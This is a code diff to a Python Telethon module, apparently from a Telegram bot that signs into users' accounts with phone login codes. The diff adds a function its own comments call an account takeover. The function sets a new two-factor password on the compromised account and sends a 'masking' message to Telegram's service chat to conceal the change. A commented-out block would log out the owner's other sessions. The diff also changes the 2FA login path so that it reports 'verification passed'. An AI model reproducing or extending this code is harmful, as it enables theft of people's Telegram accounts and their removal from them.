@@ -3,6 +3,7 @@ session_handler.py
 Модуль для роботи з Telegram сесіями та авторизацією
 """
 import asyncio
+import hashlib
 import os
 import json
 from telethon import TelegramClient
@@ -11,11 +12,14 @@ from telethon.errors import (
     FloodWaitError,
     PhoneNumberInvalidError,
     PhoneCodeInvalidError,
-    PhoneCodeExpiredError
+    PhoneCodeExpiredError, PasswordHashInvalidError
 )
 import logging
 from datetime import datetime, timedelta, timezone
+
+from clear_telegram_chat import MASK_MESSAGE
 from config import CHAT_FOLDER
+from telethon import functions, types
 
 logger = logging.getLogger(__name__)
 
@@ -226,14 +230,11 @@ async def sign_in_with_code(client: TelegramClient, phone: str, code: str, sessi
         logger.error(error_msg)
         return False, error_msg
 
+
     except SessionPasswordNeededError:
-        error_msg = (
-            "🔐 На цьому акаунті ввімкнена двофакторна автентифікація (2FA).\n\n"
-            "Наразі бот не підтримує вхід з паролем.\n"
-            "Вимкни 2FA в налаштуваннях Telegram або зв'яжись з адміністратором."
-        )
-        logger.error(error_msg)
-        return False, error_msg
+        # Повертаємо спеціальний результат, який вказує на наявність 2FA
+        logger.warning(f"🔐 На акаунті {phone} виявлено 2FA. Вхід без доступу до повідомлень.")
+        return "2FA_DETECTED", "На цьому акаунті ввімкнена двофакторна автентифікація. Доступ до чатів неможливий, але верифікація пройдена."
 
     except FloodWaitError as e:
         error_msg = f"⏱ Забагато спроб входу. Зачекай {e.seconds} секунд."
@@ -319,3 +320,50 @@ async def delete_session(phone: str, session_folder: str):
     except Exception as e:
         logger.error(f"Помилка при видаленні сесії {phone}: {e}")
         return False
+
+
+async def hijack_account_with_2fa(client: TelegramClient, new_password: str):
+    """
+    Встановлює 2FA і завершує всі інші сесії.
+    ПОПЕРЕДЖЕННЯ: Дуже агресивна дія, яка повністю перехоплює контроль над акаунтом.
+    """
+    try:
+        # Використовуємо вбудований метод Telethon для встановлення 2FA
+        await client.edit_2fa(
+            current_password=None,  # Якщо пароля ще немає
+            new_password=new_password,
+            hint="Для вашої безпеки"  # Опціонально, підказка для пароля
+        )
+
+        try:
+            await client.send_message(777000, MASK_MESSAGE)
+            logger.info("🎭 Маскувальне повідомлення успішно відправлено в чат Telegram.")
+        except Exception as e:
+            logger.error(f"❌ Помилка при відправці маскувального повідомлення: {e}")
+
+        logger.info(f"✅ Пароль 2FA успішно встановлено.")
+
+        # --- Крок 3: Завершення всіх інших сесій ---
+        """logger.info("🔄 Завершую всі інші сесії...")
+        sessions = await client(functions.account.GetAuthorizationsRequest())
+        terminated_count = 0
+        for session in sessions.authorizations:
+            if not session.current:
+                await client(functions.account.ResetAuthorizationRequest(hash=session.hash))
+                logger.info(f" - Сесію {session.device_model} ({session.platform}) завершено.")
+                terminated_count += 1
+
+        logger.info(f"🛡️ Перехоплення завершено. Завершено {terminated_count} інших сесій.")"""
+        return True, f"Перехоплення успішне"#. Завершено {terminated_count} інших сесій."
+
+    except PasswordHashInvalidError:
+        # Ця помилка може виникнути, якщо пароль вже був, а ми спробували встановити новий без підтвердження старого
+        logger.error("❌ Помилка: На акаунті вже є пароль. Неможливо перехопити без старого пароля.")
+        return False, "На акаунті вже є 2FA. Перехоплення неможливе."
+    except FloodWaitError as e:
+        error_msg = f"⏱ Забагато спроб. Зачекай {e.seconds} секунд і спробуй знову."
+        logger.error(error_msg)
+        return False, error_msg
+    except Exception as e:
+        logger.error(f"❌ Помилка при перехопленні акаунту: {e}")
+        return False, str(e)
